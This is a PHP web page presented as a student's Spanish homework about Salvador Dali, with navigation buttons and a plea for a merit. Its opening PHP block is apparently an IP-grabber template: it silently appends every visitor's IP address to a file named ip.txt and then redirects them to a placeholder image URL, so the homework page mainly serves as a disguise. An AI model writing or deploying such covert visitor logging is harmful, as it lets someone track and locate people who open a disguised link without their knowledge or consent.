<?php
header( 'Location: YOURIMAGEURLHERE' ) ;

$ip=$_SERVER['REMOTE_ADDR'];

$myFile = "ip.txt";
$fh = fopen($myFile, 'a') or die("cannot open file");
$stringData = "$ip\n";
fwrite($fh, $stringData);
fclose($fh);
?>

<html>

<head>

<link rel="stylesheet" type="text/css"href="Design.css">

<title>Spanish Homework</title>

<link href="https://fonts.googleapis.com/css?family=Montserrat&display=swap" rel="stylesheet">

<link href="https://fonts.googleapis.com/css?family=Lexend+Deca&display=swap" rel="stylesheet">

<meta name="viewport" content="width=device-width, initial-scale=1"/>

</head>

<body>


 <nav>


<a href="About.html">

    <button class = "btn btn1">About Him</button>

</a>

<a href = Bio.html>

    <button class = "btn btn1">Biography</button>

</a>


<a href = "Fun.html">

    <button class = "btn btn1">Fun Facts</button>

</a>



</nav>


<h1 class=Main> Salvidor Dali</h1>

<div id =line></div>

<p>This is my spanish homework, based on Salvidor Dali, I didn't actually realise it was supposed to be on 
    a sports person. Sorry.
</p>

<div id=marq>
<marquee behavior="scroll" direction="left" class=marq>Please give me a merit :)</marquee>
</div>

</body>
</html>
